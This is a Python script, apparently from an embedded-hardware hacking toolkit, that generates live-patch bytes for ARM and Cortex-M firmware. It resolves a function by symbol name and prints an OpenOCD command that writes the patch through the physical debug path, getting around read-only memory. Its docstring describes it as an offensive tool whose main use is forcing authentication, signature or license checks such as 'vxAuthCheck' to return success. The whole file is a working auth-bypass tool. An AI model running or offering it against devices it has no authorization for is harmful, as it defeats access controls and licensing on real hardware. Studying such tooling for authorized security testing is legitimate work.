#!/usr/bin/env python3
"""
patch-recipe.py — generate a function-level live-patch recipe (defeat an auth check, force a return value,
NOP a call, hang at a point) and emit the ready `probe-phys-patch.tcl` command.

This is the offensive counterpart to find-patch-target.py (which finds STRINGS): here you target a FUNCTION
by name (resolved from a symbol map) or by VA, pick a behaviour, and get the exact patch bytes + command.
The classic move: force an authentication / signature / license check to return "success".

Behaviours (per architecture):
  ret0  -> "mov w0,#0 ; ret"  (return 0)        ret1 -> return 1
  nop   -> a single NOP at the VA               hang -> "b ." (infinite loop — freeze at this point)
Architectures: aarch64 (A53/A72 — ZynqMP/Pi), armv7 (A9 ARM mode — Zynq-7000), thumb (Cortex-M).

Usage:
    python3 tools/patch-recipe.py --arch aarch64 --func vxAuthCheck --syms dumps/symbols.txt --behavior ret0
    python3 tools/patch-recipe.py --arch thumb --va 0x08001234 --behavior nop
    python3 tools/patch-recipe.py --arch aarch64 --func foo --syms map.txt --behavior ret1 \
        --cfg openocd/zcu102.cfg --pa-math virt2phys
Offline / read-only. The emitted command writes the bytes via the AXI-AP physical path (bypasses MMU RO).
WARNING: a function-return patch changes BEHAVIOUR — only do this on a target you're authorized to modify.
"""
import argparse, re, struct, sys

# instruction encodings per arch. value is the 32/16-bit opcode; we emit it as the in-memory LE byte string.
_A64 = {"movz_w0_0": 0x52800000, "movz_w0_1": 0x52800020, "ret": 0xD65F03C0, "nop": 0xD503201F, "b_self": 0x14000000}
_A32 = {"mov_r0_0": 0xE3A00000, "mov_r0_1": 0xE3A00001, "bxlr": 0xE12FFF1E, "nop": 0xE320F000, "b_self": 0xEAFFFFFE}
_T16 = {"movs_r0_0": 0x2000, "movs_r0_1": 0x2001, "bxlr": 0x4770, "nop": 0xBF00, "b_self": 0xE7FE}


def _le(words, width):
    """list of opcodes -> in-memory little-endian hex byte string."""
    out = b""
    for w in words:
        out += struct.pack("<I" if width == 4 else "<H", w)
    return out.hex()


def recipe(arch, behavior):
    """return (hex_bytes, human description)."""
    if arch == "aarch64":
        if behavior == "ret0":  return _le([_A64["movz_w0_0"], _A64["ret"]], 4), "mov w0,#0 ; ret"
        if behavior == "ret1":  return _le([_A64["movz_w0_1"], _A64["ret"]], 4), "mov w0,#1 ; ret"
        if behavior == "nop":   return _le([_A64["nop"]], 4), "nop"
        if behavior == "hang":  return _le([_A64["b_self"]], 4), "b . (hang)"
    if arch == "armv7":
        if behavior == "ret0":  return _le([_A32["mov_r0_0"], _A32["bxlr"]], 4), "mov r0,#0 ; bx lr"
        if behavior == "ret1":  return _le([_A32["mov_r0_1"], _A32["bxlr"]], 4), "mov r0,#1 ; bx lr"
        if behavior == "nop":   return _le([_A32["nop"]], 4), "nop"
        if behavior == "hang":  return _le([_A32["b_self"]], 4), "b . (hang)"
    if arch == "thumb":
        if behavior == "ret0":  return _le([_T16["movs_r0_0"], _T16["bxlr"]], 2), "movs r0,#0 ; bx lr"
        if behavior == "ret1":  return _le([_T16["movs_r0_1"], _T16["bxlr"]], 2), "movs r0,#1 ; bx lr"
        if behavior == "nop":   return _le([_T16["nop"]], 2), "nop"
        if behavior == "hang":  return _le([_T16["b_self"]], 2), "b . (hang)"
    sys.exit(f"no recipe for arch={arch} behavior={behavior}")


def resolve(func, syms):
    """find func's VA in a symbol map ('0xADDR name' per line, e.g. vxworks-symtab.py --out-map)."""
    rx = re.compile(r"^\s*(0x[0-9a-fA-F]+)\s+(\S+)")
    hits = []
    for line in open(syms, encoding="utf-8", errors="replace"):
        m = rx.match(line)
        if m and m.group(2) == func:
            hits.append(int(m.group(1), 16))
    if not hits:
        # fall back to substring, list candidates
        cands = [(int(m.group(1), 16), m.group(2)) for m in
                 (rx.match(l) for l in open(syms, encoding="utf-8", errors="replace")) if m and func.lower() in m.group(2).lower()]
        if cands:
            sys.exit(f"no exact symbol '{func}'. Did you mean: " + ", ".join(f"{n}@0x{a:x}" for a, n in cands[:8]))
        sys.exit(f"symbol '{func}' not found in {syms}")
    return hits[0]


def main():
    ap = argparse.ArgumentParser(description="Generate a function live-patch recipe + probe-phys-patch command.")
    ap.add_argument("--arch", required=True, choices=["aarch64", "armv7", "thumb"])
    ap.add_argument("--behavior", default="ret0", choices=["ret0", "ret1", "nop", "hang"])
    g = ap.add_mutually_exclusive_group(required=True)
    g.add_argument("--va", help="target virtual address (e.g. 0xffffffff80928678)")
    g.add_argument("--func", help="function name to resolve from --syms")
    ap.add_argument("--syms", help="symbol map (0xADDR name per line; from vxworks-symtab.py --out-map / kallsyms)")
    ap.add_argument("--cfg", default="openocd/zcu102.cfg")
    ap.add_argument("--pa-math", choices=["linear", "virt2phys"], default="linear",
                    help="how probe-phys-patch maps VA->PA (virt2phys for Linux/KASLR; linear for VxWorks)")
    ap.add_argument("--patch-env", default="", help="extra PATCH_* env for a non-ZynqMP SoC, e.g. "
                    "'PATCH_CORE=zynq.cpu0 PATCH_AXI=zynq.axi PATCH_DAP=zynq.dap'")
    a = ap.parse_args()

    if a.func:
        if not a.syms:
            sys.exit("--func needs --syms")
        va = resolve(a.func, a.syms); label = a.func
    else:
        va = int(a.va, 0); label = a.va
    hexbytes, desc = recipe(a.arch, a.behavior)

    print(f"# patch recipe — {a.behavior} on {label} (VA 0x{va:x}) [{a.arch}]")
    print(f"#   {desc}   ->   bytes: {hexbytes}")
    print(f"#   (a return-value patch on an MMU part: probe-phys-patch writes the PHYSICAL bytes, bypassing RO .text)")
    v2p = "PATCH_USE_V2P=1 " if a.pa_math == "virt2phys" else ""
    extra = (a.patch_env + " ") if a.patch_env else ""
    print()
    print(f"{extra}{v2p}PATCH_VA=0x{va:x} PATCH_HEX={hexbytes} PATCH_RESTORE=0 \\")
    print(f"  openocd -f {a.cfg} -c \"init; source openocd/probe-phys-patch.tcl; shutdown\"")
    print()
    print("# verify it took: re-run with PATCH_RESTORE=1 to restore, or read the VA back. The function now "
          f"{'returns ' + a.behavior[3:] if a.behavior.startswith('ret') else a.behavior + 's'}.")


if __name__ == "__main__":
    main()
